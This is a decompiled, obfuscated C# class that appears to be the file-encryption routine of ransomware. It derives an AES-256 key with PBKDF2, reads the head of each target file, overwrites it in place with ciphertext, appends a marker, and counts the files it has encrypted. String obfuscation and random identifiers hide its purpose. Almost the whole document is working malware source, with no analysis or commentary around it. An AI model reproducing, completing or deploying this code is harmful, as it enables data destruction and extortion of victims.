using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Security.Cryptography;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace FEPAnxLYcpgz;

public static class jpQAwiraQIs
{
	[NonSerialized]
	internal static GetString getString_0;

	public static byte[] yMRxObPGGIdX(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = mfJiGAHdSHrKAR(byte_1, byte_2);
		byte_1 = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(byte_0, 0, byte_0.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static Rfc2898DeriveBytes mfJiGAHdSHrKAR(byte[] byte_0, byte[] byte_1)
	{
		return new Rfc2898DeriveBytes(byte_0, byte_1, 52768);
	}

	public static byte[] zpWCtoaisOqzF(string string_0, int int_0)
	{
		byte[] array = new byte[int_0];
		try
		{
			if (frAELqEtncDC.ObdFXRKnttrKo == getString_0(107396976))
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(string_0, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, int_0);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, int_0);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (frAELqEtncDC.fKNptYRWsQNeZX)
			{
				try
				{
					File.AppendAllText(frAELqEtncDC.TVaVFXxrZtbC, getString_0(107462404) + string_0 + getString_0(107475252) + ex.Message + getString_0(107396317));
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, int_0);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static void tysVjCOwDEtQNM(string JnWAbAIYOaQdZ, byte[] ZTOewjTQMwEKyLZ, byte[] FIhAxdzfLIbX = null)
	{
		try
		{
			byte[] array = null;
			if (frAELqEtncDC.ObdFXRKnttrKo == getString_0(107396976))
			{
				array = (frAELqEtncDC.jHNjZakAkEHPd ? Encoding.ASCII.GetBytes(frAELqEtncDC.aTyvnaQgFklB(frAELqEtncDC.DlqNAdVPvtac) + frAELqEtncDC.aTyvnaQgFklB(getString_0(107475194)) + Convert.ToString(frAELqEtncDC.VwOPUhcZlsvZmR) + frAELqEtncDC.aTyvnaQgFklB(getString_0(107475194))) : Encoding.ASCII.GetBytes(frAELqEtncDC.aTyvnaQgFklB(frAELqEtncDC.DlqNAdVPvtac) + frAELqEtncDC.aTyvnaQgFklB(getString_0(107475171)) + Convert.ToString(frAELqEtncDC.VwOPUhcZlsvZmR) + frAELqEtncDC.aTyvnaQgFklB(getString_0(107475171))));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(JnWAbAIYOaQdZ, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(ZTOewjTQMwEKyLZ, 0, ZTOewjTQMwEKyLZ.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(JnWAbAIYOaQdZ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!frAELqEtncDC.jHNjZakAkEHPd)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(FIhAxdzfLIbX, 0, FIhAxdzfLIbX.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (frAELqEtncDC.jHNjZakAkEHPd ? Encoding.ASCII.GetBytes(frAELqEtncDC.aTyvnaQgFklB(frAELqEtncDC.DlqNAdVPvtac) + frAELqEtncDC.aTyvnaQgFklB(getString_0(107475194)) + Convert.ToString(frAELqEtncDC.VwOPUhcZlsvZmR) + frAELqEtncDC.aTyvnaQgFklB(getString_0(107475194))) : Encoding.ASCII.GetBytes(frAELqEtncDC.aTyvnaQgFklB(frAELqEtncDC.DlqNAdVPvtac) + frAELqEtncDC.aTyvnaQgFklB(getString_0(107475171)) + Convert.ToString(frAELqEtncDC.VwOPUhcZlsvZmR) + frAELqEtncDC.aTyvnaQgFklB(getString_0(107475171))));
				FileStream fileStream2 = new FileStream(JnWAbAIYOaQdZ, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(ZTOewjTQMwEKyLZ, 0, ZTOewjTQMwEKyLZ.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(JnWAbAIYOaQdZ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!frAELqEtncDC.jHNjZakAkEHPd)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(FIhAxdzfLIbX, 0, FIhAxdzfLIbX.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			frAELqEtncDC.LHsTakbnvLMZqfZlb++;
		}
		catch (Exception ex)
		{
			if (frAELqEtncDC.fKNptYRWsQNeZX)
			{
				try
				{
					File.AppendAllText(frAELqEtncDC.TVaVFXxrZtbC, getString_0(107462404) + JnWAbAIYOaQdZ + getString_0(107475185) + ex.Message + getString_0(107396317));
				}
				catch (Exception)
				{
				}
			}
			byte[] array2 = null;
			array2 = (frAELqEtncDC.jHNjZakAkEHPd ? Encoding.ASCII.GetBytes(frAELqEtncDC.aTyvnaQgFklB(frAELqEtncDC.DlqNAdVPvtac) + frAELqEtncDC.aTyvnaQgFklB(getString_0(107475194)) + Convert.ToString(frAELqEtncDC.VwOPUhcZlsvZmR) + frAELqEtncDC.aTyvnaQgFklB(getString_0(107475194))) : Encoding.ASCII.GetBytes(frAELqEtncDC.aTyvnaQgFklB(frAELqEtncDC.DlqNAdVPvtac) + frAELqEtncDC.aTyvnaQgFklB(getString_0(107475171)) + Convert.ToString(frAELqEtncDC.VwOPUhcZlsvZmR) + frAELqEtncDC.aTyvnaQgFklB(getString_0(107475171))));
			FileStream fileStream4 = new FileStream(JnWAbAIYOaQdZ, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
			fileStream4.Write(ZTOewjTQMwEKyLZ, 0, ZTOewjTQMwEKyLZ.Length);
			fileStream4.Close();
			fileStream4.Dispose();
			using FileStream fileStream5 = new FileStream(JnWAbAIYOaQdZ, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			if (!frAELqEtncDC.jHNjZakAkEHPd)
			{
				fileStream5.Write(array2, 0, array2.Length);
				return;
			}
			fileStream5.Write(FIhAxdzfLIbX, 0, FIhAxdzfLIbX.Length);
			fileStream5.Write(array2, 0, array2.Length);
		}
	}

	static jpQAwiraQIs()
	{
		Strings.CreateGetStringDelegate(typeof(jpQAwiraQIs));
	}
}
